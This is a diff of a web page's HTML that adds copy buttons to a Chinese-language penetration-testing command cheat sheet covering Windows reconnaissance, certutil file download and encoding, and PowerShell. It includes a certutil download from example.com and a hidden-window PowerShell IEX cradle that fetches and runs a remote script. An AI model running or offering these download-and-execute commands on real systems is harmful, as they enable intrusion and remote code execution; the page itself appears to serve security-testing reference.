@@ -6,27 +6,31 @@ header: |
                             <!-- 渗透测试常用命令展示区域 -->
                             <div class="common-commands">
                                 <div class="command-group">
-                                    <h3>渗透测试常用命令</h3>
+                                    <h3>渗透测试常用命令 <small style="font-weight: normal; opacity: 0.7;">(点击即可复制)</small></h3>
                                     <div class="command-list">
                                         <!-- 系统信息收集 -->
                                         <div class="command-category">
                                             <div class="command-category-title">系统信息收集</div>
                                             <div class="command-items">
-                                                <div class="command-item" data-command="wmic process list full">
-                                                    <code>wmic process list full</code>
+                                                <div class="command-item">
+                                                    <code id="cmd1">wmic process list full</code>
                                                     <span class="command-desc">查看进程详细信息</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('wmic process list full')">复制</button>
                                                 </div>
-                                                <div class="command-item" data-command="wmic service list full">
-                                                    <code>wmic service list full</code>
+                                                <div class="command-item">
+                                                    <code id="cmd2">wmic service list full</code>
                                                     <span class="command-desc">查看服务详细信息</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('wmic service list full')">复制</button>
                                                 </div>
-                                                <div class="command-item" data-command="wmic useraccount list full">
-                                                    <code>wmic useraccount list full</code>
+                                                <div class="command-item">
+                                                    <code id="cmd3">wmic useraccount list full</code>
                                                     <span class="command-desc">查看用户账户信息</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('wmic useraccount list full')">复制</button>
                                                 </div>
-                                                <div class="command-item" data-command="systeminfo">
-                                                    <code>systeminfo</code>
+                                                <div class="command-item">
+                                                    <code id="cmd4">systeminfo</code>
                                                     <span class="command-desc">查看系统信息</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('systeminfo')">复制</button>
                                                 </div>
                                             </div>
                                         </div>
@@ -35,21 +39,25 @@ header: |
                                         <div class="command-category">
                                             <div class="command-category-title">网络信息收集</div>
                                             <div class="command-items">
-                                                <div class="command-item" data-command="netstat -ano">
-                                                    <code>netstat -ano</code>
+                                                <div class="command-item">
+                                                    <code id="cmd5">netstat -ano</code>
                                                     <span class="command-desc">查看网络连接和进程</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('netstat -ano')">复制</button>
                                                 </div>
-                                                <div class="command-item" data-command="ipconfig /all">
-                                                    <code>ipconfig /all</code>
+                                                <div class="command-item">
+                                                    <code id="cmd6">ipconfig /all</code>
                                                     <span class="command-desc">查看网络配置</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('ipconfig /all')">复制</button>
                                                 </div>
-                                                <div class="command-item" data-command="arp -a">
-                                                    <code>arp -a</code>
+                                                <div class="command-item">
+                                                    <code id="cmd7">arp -a</code>
                                                     <span class="command-desc">查看ARP缓存</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('arp -a')">复制</button>
                                                 </div>
-                                                <div class="command-item" data-command="route print">
-                                                    <code>route print</code>
+                                                <div class="command-item">
+                                                    <code id="cmd8">route print</code>
                                                     <span class="command-desc">查看路由表</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('route print')">复制</button>
                                                 </div>
                                             </div>
                                         </div>
@@ -58,17 +66,20 @@ header: |
                                         <div class="command-category">
                                             <div class="command-category-title">文件操作</div>
                                             <div class="command-items">
-                                                <div class="command-item" data-command="certutil -urlcache -split -f http://example.com/file.exe file.exe">
-                                                    <code>certutil -urlcache -split -f http://example.com/file.exe file.exe</code>
+                                                <div class="command-item">
+                                                    <code id="cmd9">certutil -urlcache -split -f http://example.com/file.exe file.exe</code>
                                                     <span class="command-desc">下载文件</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('certutil -urlcache -split -f http://example.com/file.exe file.exe')">复制</button>
                                                 </div>
-                                                <div class="command-item" data-command="certutil -encode file.txt file.b64">
-                                                    <code>certutil -encode file.txt file.b64</code>
+                                                <div class="command-item">
+                                                    <code id="cmd10">certutil -encode file.txt file.b64</code>
                                                     <span class="command-desc">Base64编码</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('certutil -encode file.txt file.b64')">复制</button>
                                                 </div>
-                                                <div class="command-item" data-command="certutil -decode file.b64 file.txt">
-                                                    <code>certutil -decode file.b64 file.txt</code>
+                                                <div class="command-item">
+                                                    <code id="cmd11">certutil -decode file.b64 file.txt</code>
                                                     <span class="command-desc">Base64解码</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('certutil -decode file.b64 file.txt')">复制</button>
                                                 </div>
                                             </div>
                                         </div>
@@ -77,13 +88,15 @@ header: |
                                         <div class="command-category">
                                             <div class="command-category-title">PowerShell命令</div>
                                             <div class="command-items">
-                                                <div class="command-item" data-command="powershell -enc [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('command'))">
-                                                    <code>powershell -enc [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('command'))</code>
+                                                <div class="command-item">
+                                                    <code id="cmd12">powershell -enc [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('command'))</code>
                                                     <span class="command-desc">PowerShell命令编码</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('powershell -enc [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\'command\'))')">复制</button>
                                                 </div>
-                                                <div class="command-item" data-command="powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://example.com/script.ps1'))&quot;">
-                                                    <code>powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://example.com/script.ps1'))"</code>
+                                                <div class="command-item">
+                                                    <code id="cmd13">powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://example.com/script.ps1'))"</code>
                                                     <span class="command-desc">远程执行PowerShell脚本</span>
+                                                    <button class="copy-btn" onclick="copyTextToClipboard('powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\'http://example.com/script.ps1\'))&quot;')">复制</button>
                                                 </div>
                                             </div>
                                         </div>
@@ -130,7 +143,7 @@ header: |
                         <label for="json-file"><input type="file" id="json-file" accept=".json" /></label>
                         <div class="button-selection">
                             <a class="button" id="button-template" aria-haspopup="listbox" aria-expanded="false" role="combobox" tabindex="2" aria-controls="menu-templates"><strong>Selected template</strong>: <span id="template-selected">(none)</span></a>
-                            <a class="button" id="download-config" download="config-export.json" data-visit-click="JSON-Download" tabindex="3"><strong>Download config</strong></a>
+                            <a class="button" id="download-config" download="config-export.json" tabindex="3"><strong>Download config</strong></a>
                             <a class="button" id="reset-form" tabindex="4"><strong>Reset</strong></a>
                         </div>
                     </div>
